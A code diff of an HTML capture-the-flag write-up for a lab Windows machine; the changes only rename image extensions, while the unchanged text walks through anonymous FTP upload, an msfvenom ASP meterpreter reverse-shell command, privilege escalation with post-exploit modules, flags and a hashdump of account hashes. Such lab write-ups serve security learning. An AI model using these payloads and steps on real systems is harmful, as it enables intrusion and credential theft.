@@ -86,70 +86,70 @@
       <h1 id="who-am-i">Who am I?</h1> 
       Jerry is rated as an medium machine
 <p>
-  <img src="images//devil/devil0.PNG" alt="" width="500" height="150" />
-  <img src="images//devil/devil_1.PNG" alt="" width="500" height="150" />
+  <img src="images//devil/devil0.png" alt="" width="500" height="150" />
+  <img src="images//devil/devil_1.png" alt="" width="500" height="150" />
 
 </p>
 <h1 id="exam-timeline">NMAP result</h1>
-<img src="images//devil/nmap_image_1.PNG" alt="n" class="center">
-<img src="images//devil/nmap_image_2.PNG" alt="" class="center">
+<img src="images//devil/nmap_image_1.png" alt="n" class="center">
+<img src="images//devil/nmap_image_2.png" alt="" class="center">
 <p>We see FTP port 21 wiht Anonymous login. Port 80 is also open  </p>
 <h3>HTTP</h3>
 <p>When we deal with a website, I like to open dirbuster for hidden directory</p>
-<img src="images//devil/80_image_1.PNG" width="8000" height="300" />
+<img src="images//devil/80_image_1.png" width="8000" height="300" />
 <h3>FTP</h3>
-<img src="images//devil/21_image_1.PNG" />
+<img src="images//devil/21_image_1.png" />
 <p> We start with logging to the ftwp with Anonymous user
 We downloaded the data to look for clues</p>
-<img src="images//devil/21_image_2.PNG" /><br>
-<img src="images//devil/21_image_3.PNG" />
+<img src="images//devil/21_image_2.png" /><br>
+<img src="images//devil/21_image_3.png" />
 <p>We used the <b>put</b> command and manage to add a file to the FTP</p>
-<img src="images//devil/21_image_4.PNG" />
-<img src="images//devil/21_image_5.PNG" />
+<img src="images//devil/21_image_4.png" />
+<img src="images//devil/21_image_5.png" />
 <p>Since we are able to put files and execute them, we can add malware to the website
 We are going to generate a malware, with msfvenom source: <b>https://netsec.ws/?p=331</b>>
 Since it is a windows server we know it is using ASP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</p>
-<img src="images//devil/images//devil/21_image_6.PNG" />
+<img src="images//devil/images//devil/21_image_6.png" />
 <p>The above image did not work, we dont know if the windows system is a x64 or x86. WHen trying the above command our multi handler was listening and nothing happend. We then tried to do it again with a x86.</p>
-<img src="images//devil/21_image_7.PNG" />
+<img src="images//devil/21_image_7.png" />
 <p>WE can see that we are not system</p>
-<img src="images//devil/21_image_8.PNG" />
+<img src="images//devil/21_image_8.png" />
 <p>Meaning we can run some commands, we tried using getsystem but now luck.
 What we can try to do is to try run a post exploit which will try to find ways for us to be system,
 we but or current session in the background (ctrl+z, y) and go back to msfconsole</p>
-<img src="images//devil/21_image_9.PNG" />
-<img src="images//devil/21_image_10.PNG" /><br>
-<img src="images//devil/21_image_11.PNG" />
+<img src="images//devil/21_image_9.png" />
+<img src="images//devil/21_image_10.png" /><br>
+<img src="images//devil/21_image_11.png" />
 <p>We are not system(root)
 what we can do is to run a post exploit that will find ways for use to be system
 We could try all of them, but let go with of that works, the post module found ways for use to get root
 We tried the first suggestion</p>
-<img src="images//devil/21_image_12.PNG" />
-<img src="images//devil/21_image_13.PNG" />
+<img src="images//devil/21_image_12.png" />
+<img src="images//devil/21_image_13.png" />
 <p>This wont works insce the handler is using 192.168.1.134, this is not our local host, we need to
 show options -> set lhost 10.10.14.14</p>
-<img src="images//devil/21_image_14.PNG" />
+<img src="images//devil/21_image_14.png" />
 <p>port 4444 is already used</p>
-<img src="images//devil/21_image_15.PNG" />
+<img src="images//devil/21_image_15.png" />
 <p>We got a meterpreter shell and this time we are root</p>
-<img src="images//devil/21_image_16.PNG" />
-<img src="images//devil/21_image_17.PNG" />
+<img src="images//devil/21_image_16.png" />
+<img src="images//devil/21_image_17.png" />
 <p>it seems to be a user with the name "babis" here lets hunt for flags, we go to c and tab for options</p>
-<img src="images//devil/21_image_18.PNG" />
-<img src="images//devil/21_image_19.PNG" />
+<img src="images//devil/21_image_18.png" />
+<img src="images//devil/21_image_19.png" />
 <p><b>root: e621a0b5041708797c4fc4728bc72b4b</b>
 earlier we found a user named babies, we found her desktop and found the flag
 noticed the ".txt.txt"</p>
 
-<img src="images//devil/21_image_20.PNG" />
+<img src="images//devil/21_image_20.png" />
 <p><b>user: 9ecdd6a3aedf24b41562fea70f4cb3e8</b></p>
 <p>Extra, but no luck
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a450f6000be7df50ee304d0a838d638f:::
 babis:1000:aad3b435b51404eeaad3b435b51404ee:a1133ec0f7779e215acc8a36922acf57:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</p>
-<img src="images//devil/21_image_21.PNG" />
+<img src="images//devil/21_image_21.png" />
 
 
 
